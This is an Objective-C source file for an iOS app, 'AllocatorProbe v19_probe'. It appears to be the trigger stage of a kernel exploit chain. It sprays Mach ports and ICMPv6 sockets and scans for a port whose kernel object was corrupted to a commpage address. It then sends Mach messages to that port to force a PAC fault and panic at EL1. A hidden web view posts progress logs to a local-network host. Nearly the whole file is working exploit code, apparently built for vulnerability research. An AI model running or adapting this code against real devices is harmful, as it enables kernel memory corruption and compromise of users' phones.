/*
 * AllocatorProbe v19_probe — mach_msg_send path -> EL1 PAC fault at COMMPAGE_TARGET
 * =====================================================================================
 * Updated from v18_probe. AGXFire sets io_bits=IKOT_TIMER (0x8000001B) +
 * io_refs=1 + ip_kobject=COMMPAGE_TARGET (0x0000000FFFFFC330) via VOB overflow.
 *
 * Kernel path for corrupted TIMER port (F-74 fix — no thread->recover):
 *   mach_msg_send -> ipc_kobject_server (no thread->recover set) ->
 *   dispatch table[kotype](request) -> BLRAA X16(=ip_kobject=COMMPAGE_TARGET) ->
 *   PAC authentication fails at EL1 ->
 *   kernel panic: X16=0x0000000FFFFFC330 in panic dump ->
 *   QUALIFYING: IPS with COMMPAGE_TARGET in kernel GPR register
 *
 * Previous v18_probe used mach_port_mod_refs -> ipc_kobject_destroy which HAS
 * thread->recover set -> caught, not fatal. Fixed in v19_probe.
 *
 * Detection: kobject==COMMPAGE_TARGET (kotype obfuscated to 0xFFFFFFFF on iOS 26.x).
 */

#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#include <mach/mach.h>
#include <mach/message.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdarg.h>
#include <unistd.h>

#define NUM_PORTS        20000
#define NUM_SOCKETS      200
#define COMMPAGE_TARGET      0x0000000FFFFFC330ULL
#define COMMPAGE_TARGET_KERN 0xFFFFFE00FFFFC330ULL
#define IKOT_TIMER           27
#define REPORT_HOST          "192.168.68.106"
#define PROBE_INTERVAL_S     1

static mach_port_t g_ports[NUM_PORTS];
static int         g_port_count = 0;
static int         g_socks[NUM_SOCKETS];
static int         g_sock_count = 0;
static _Atomic int g_found = 0;
static WKWebView  *g_webView = nil;
static FILE       *g_logfile = NULL;

static void file_log(const char *msg) {
    if (!g_logfile) return;
    fprintf(g_logfile, "%s\n", msg);
    fflush(g_logfile);
}

static void http_report(const char *msg) {
    WKWebView *wv = g_webView;
    if (!wv) return;
    NSString *raw = [NSString stringWithUTF8String:msg];
    if (!raw) return;
    raw = [raw stringByReplacingOccurrencesOfString:@"\\" withString:@"\\\\"];
    raw = [raw stringByReplacingOccurrencesOfString:@"'" withString:@"\\'"];
    NSString *script = [NSString stringWithFormat:
        @"var x=new XMLHttpRequest();"
        "x.open('POST','http://%s:9999/',true);"
        "x.send('[v19p] %@');",
        REPORT_HOST, raw];
    dispatch_async(dispatch_get_main_queue(), ^{
        [wv evaluateJavaScript:script completionHandler:nil];
    });
}

static void ev(const char *fmt, ...) {
    char buf[512]; va_list ap;
    va_start(ap, fmt); vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
    NSLog(@"[v19p] %{public}s", buf);
    file_log(buf);
    http_report(buf);
}

typedef struct { mach_msg_header_t hdr; } NullMsg_t;

static void fire_mach_msg(mach_port_t port) {
    /* mach_msg_send to corrupted port:
     * ipc_kobject_server (no thread->recover) ->
     * BLRAA X16(=ip_kobject=COMMPAGE_TARGET) -> PAC fail at EL1 ->
     * kernel panic with COMMPAGE_TARGET in X16 (qualifying GPR). */
    NullMsg_t m;
    memset(&m, 0, sizeof(m));
    m.hdr.msgh_bits        = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    m.hdr.msgh_size        = sizeof(m);
    m.hdr.msgh_remote_port = port;
    m.hdr.msgh_local_port  = MACH_PORT_NULL;
    m.hdr.msgh_id          = 0xF74;
    mach_msg(&m.hdr, MACH_SEND_MSG, sizeof(m), 0,
             MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
}

static void spray(void) {
    unsigned char ff[32]; memset(ff, 0xFF, 32);
    for (int i = 0; i < NUM_SOCKETS; i++) {
        int fd = socket(30, 2, 58);
        if (fd < 0) break;
        setsockopt(fd, 58, 18, ff, 32);
        g_socks[g_sock_count++] = fd;
    }
    mach_port_t task = mach_task_self();
    for (int i = 0; i < NUM_PORTS; i++) {
        mach_port_t p = MACH_PORT_NULL;
        if (mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS) break;
        if (mach_port_insert_right(task, p, p, MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS) {
            mach_port_deallocate(task, p); break;
        }
        g_ports[g_port_count++] = p;
    }
    ev("V19P_SPRAY socks=%d ports=%d target=0x%016llx kotype=%d",
       g_sock_count, g_port_count, (unsigned long long)COMMPAGE_TARGET, IKOT_TIMER);
}

/* probe_loop: scan every 1s for corrupted port, fire mach_msg_send on hit. */
static void *probe_loop(void *arg) {
    mach_port_t self = mach_task_self();
    int cycle = 0;

    for (;;) {
        int timer_ports = 0, triggered = 0;
        for (int i = 0; i < g_port_count; i++) {
            if (g_ports[i] == MACH_PORT_NULL) continue;
            natural_t kotype = 0;
            mach_vm_address_t kobject = 0;
            if (mach_port_kobject(self, g_ports[i], &kotype, &kobject) != KERN_SUCCESS)
                continue;
            if (kotype != IKOT_TIMER && kobject != COMMPAGE_TARGET && kobject != COMMPAGE_TARGET_KERN) continue;
            timer_ports++;
            ev("PROBE_HIT port=%d kotype=%u kobject=0x%016llx -> mach_msg_send",
               i, kotype, (unsigned long long)kobject);
            mach_port_t p = g_ports[i];
            g_ports[i] = MACH_PORT_NULL;
            fire_mach_msg(p);
            triggered++;
            ev("MACH_MSG_SENT port=%d (panic expected before this)", i);
        }
        cycle++;
        ev("PROBE_CYCLE cycle=%d ports=%d timer_found=%d triggered=%d",
           cycle, g_port_count, timer_ports, triggered);
        sleep(PROBE_INTERVAL_S);
    }
    return NULL;
}

static void scan_background(void) {
    if (g_found) return;
    for (int i = 0; i < g_port_count; i++) {
        if (g_found) break;
        natural_t kotype = 0; mach_vm_address_t kobject = 0;
        kern_return_t kr = mach_port_kobject(mach_task_self(), g_ports[i], &kotype, &kobject);
        if (kr != KERN_SUCCESS) continue;
        if (kotype == (natural_t)0xFFFFFFFF && kobject == 0) continue;

        if (kobject == COMMPAGE_TARGET || kobject == COMMPAGE_TARGET_KERN) {
            g_found = 1;
            ev("QUALIFYING_HIT port=%d kotype=%u kobject=0x%016llx -> mach_msg_send EL1",
               i, kotype, (unsigned long long)kobject);
            mach_port_t p = g_ports[i];
            g_ports[i] = MACH_PORT_NULL;
            fire_mach_msg(p);
        } else if (kotype != 0 || kobject != 0) {
            ev("PORT_CHANGED port=%d kotype=%u kobject=0x%016llx",
               i, kotype, (unsigned long long)kobject);
        }
    }
    for (int i = 0; i < g_sock_count; i++) {
        if (g_found) break;
        unsigned char out[32]; socklen_t flen = 32;
        if (getsockopt(g_socks[i], 58, 18, out, &flen) < 0) continue;
        for (int j = 0; j < 32; j++) {
            if (out[j] != 0xFF) {
                ev("ICMP_CORRUPTION sock=%d byte[%d]=0x%02X", i, j, out[j]);
                break;
            }
        }
    }
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong) UIWindow  *window;
@property (strong) NSTimer   *scanTimer;
@property (strong) WKWebView *reportView;
@end

@implementation AppDelegate

- (BOOL)application:(UIApplication *)app
    didFinishLaunchingWithOptions:(NSDictionary *)opts {

    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *docPath = [paths firstObject];
    NSString *logPath = [docPath stringByAppendingPathComponent:@"scan_log.txt"];
    g_logfile = fopen([logPath UTF8String], "w");

    [UIApplication sharedApplication].idleTimerDisabled = YES;

    self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
    UIViewController *vc = [[UIViewController alloc] init];
    vc.view.backgroundColor = [UIColor blackColor];
    UILabel *lbl = [[UILabel alloc] initWithFrame:CGRectMake(20, 80, 340, 60)];
    lbl.text = @"AllocatorProbe v19_probe";
    lbl.textColor = [UIColor greenColor];
    lbl.font = [UIFont fontWithName:@"Menlo" size:14];
    [vc.view addSubview:lbl];
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    WKWebViewConfiguration *cfg = [WKWebViewConfiguration new];
    cfg.allowsInlineMediaPlayback = NO;
    self.reportView = [[WKWebView alloc] initWithFrame:CGRectZero configuration:cfg];
    self.reportView.hidden = YES;
    [vc.view addSubview:self.reportView];
    [self.reportView loadHTMLString:@"<html><body></body></html>" baseURL:nil];
    g_webView = self.reportView;

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        spray();

        pthread_t probe_thread;
        pthread_create(&probe_thread, NULL, probe_loop, NULL);
        pthread_detach(probe_thread);

        ev("V19P_LAUNCH AllocatorProbe v19_probe N=%d probe-interval=%ds TIMER-kotype=%d",
           g_port_count, PROBE_INTERVAL_S, IKOT_TIMER);

        dispatch_async(dispatch_get_main_queue(), ^{
            self.scanTimer = [NSTimer scheduledTimerWithTimeInterval:0.10
                                                              target:self
                                                            selector:@selector(scanTick:)
                                                            userInfo:nil repeats:YES];
        });

        /* Blind mach_msg fire at 170s: send to all spray ports.
         * Any corrupted port -> ipc_kobject_server -> BLRAA X16(=COMMPAGE_TARGET) ->
         * PAC fail EL1 -> qualifying kernel panic. */
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 170 * NSEC_PER_SEC),
                       dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            ev("BLIND_MSG_FIRE_START n=%d", g_port_count);
            int fired = 0;
            for (int i = 0; i < g_port_count; i++) {
                if (g_ports[i] != MACH_PORT_NULL) {
                    fire_mach_msg(g_ports[i]);
                    g_ports[i] = MACH_PORT_NULL;
                    fired++;
                }
            }
            ev("BLIND_MSG_FIRE_DONE fired=%d (panic expected if port corrupted)", fired);
        });
    });

    return YES;
}

- (void)scanTick:(NSTimer *)t {
    static int tick = 0; tick++;
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        scan_background();
    });
    if (tick % 100 == 0)
        ev("ALIVE tick=%d found=%d ports=%d", tick, g_found, g_port_count);
}

@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil,
                                 NSStringFromClass([AppDelegate class]));
    }
}
